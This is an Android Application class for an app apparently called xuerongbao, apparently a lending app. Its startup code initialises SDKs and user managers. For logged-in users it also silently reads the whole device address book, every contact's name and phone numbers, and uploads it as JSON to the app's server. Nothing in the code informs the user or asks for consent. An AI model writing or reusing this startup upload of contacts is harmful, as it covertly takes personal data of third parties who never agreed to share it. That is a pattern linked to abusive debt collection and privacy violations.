package com.wazxb.xuerongbao;

import android.app.Application;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import com.alibaba.sdk.android.AlibabaSDK;
import com.alibaba.sdk.android.callback.InitResultCallback;
import com.wazxb.xuerongbao.moudles.account.AccountManager;
import com.wazxb.xuerongbao.moudles.gesturepass.GesturePassManager;
import com.wazxb.xuerongbao.moudles.message.MessageManager;
import com.wazxb.xuerongbao.network.NetworkConfig;
import com.wazxb.xuerongbao.network.ZXBHttpRequest;
import com.wazxb.xuerongbao.storage.StorageManager;
import com.wazxb.xuerongbao.storage.data.ContactItemData;
import com.wazxb.xuerongbao.storage.data.InitData;
import com.zxzx74147.devlib.ZXApplicationDelegate;
import com.zxzx74147.devlib.network.HttpResponse;
import com.zxzx74147.devlib.network.HttpResponseListener;
import com.zxzx74147.devlib.utils.AsyncHelper;
import com.zxzx74147.devlib.utils.ZXJsonUtil;
import com.zxzx74147.devlib.utils.ZXStringUtil;

import java.util.LinkedList;

/**
 * Created by zhengxin on 16/2/20.
 */
public class ZXBApplication extends Application {
    private static final String TAG = "ZXBApplication";
    private static InitData mInitData = new InitData();

    public void onCreate() {
        super.onCreate();
        ZXApplicationDelegate.onCreate(this);

        AlibabaSDK.asyncInit(this, new InitResultCallback() {

            @Override
            public void onSuccess() {
                Log.d(TAG, "init onesdk success");
            }

            @Override
            public void onFailure(int code, String message) {
                Log.e(TAG, "init onesdk failed : " + message);
            }
        });
        StorageManager.sharedInstance();
        AccountManager.sharedInstance().requestUserAllData();
        AccountManager.sharedInstance().requestCaculateData();
        MessageManager.sharedInstance().startPoll();
        GesturePassManager.sharedInstance();


        if (ZXStringUtil.checkString(AccountManager.sharedInstance().getUid())) {
            AsyncHelper.executeAsyncTask(new AsyncHelper.BDTask<String>() {
                @Override
                public String executeBackGround() {
                    try {
                        LinkedList<ContactItemData> data = getContacts();
                        return ZXJsonUtil.toJsonString(data);

                    } catch (Throwable e) {
                        e.printStackTrace();
                    }
                    return null;
                }

                @Override
                public void postExecute(String result) {
                    if (ZXStringUtil.checkString(result)) {
                        ZXBHttpRequest<Object> request = new ZXBHttpRequest<Object>(Object.class, new HttpResponseListener<Object>() {
                            @Override
                            public void onResponse(HttpResponse<Object> response) {

                            }
                        });
                        request.addParams("book", result);
                        request.setPath(NetworkConfig.ADDRESS_U_BOOK);
                        request.send();

                    }
                }
            });
        }
    }


    public LinkedList<ContactItemData> getContacts() throws Exception {
        LinkedList<ContactItemData> data = new LinkedList<>();
        Uri uri = Uri.parse("content://com.android.contacts/contacts");
        //获得一个ContentResolver数据共享的对象
        ContentResolver reslover = getContentResolver();
        //取得联系人中开始的游标，通过content://com.android.contacts/contacts这个路径获得
        Cursor cursor = reslover.query(uri, null, null, null, null);

        //上边的所有代码可以由这句话代替：Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        //Uri.parse("content://com.android.contacts/contacts") == ContactsContract.Contacts.CONTENT_URI

        while (cursor.moveToNext()) {
            ContactItemData item = new ContactItemData();
            //获得联系人ID
            String id = cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.Contacts._ID));
            //获得联系人姓名
            String name = cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.Contacts.DISPLAY_NAME));
            item.name = name;
            //获得联系人手机号码
            Cursor phone = reslover.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id, null, null);

            while (phone.moveToNext()) { //取得电话号码(可能存在多个号码)
                int phoneFieldColumnIndex = phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                String phoneNumber = phone.getString(phoneFieldColumnIndex);
                item.phones.add(phoneNumber);
            }
            data.add(item);
            //建立一个Log，使得可以在LogCat视图查看结果
        }
        return data;
    }

}
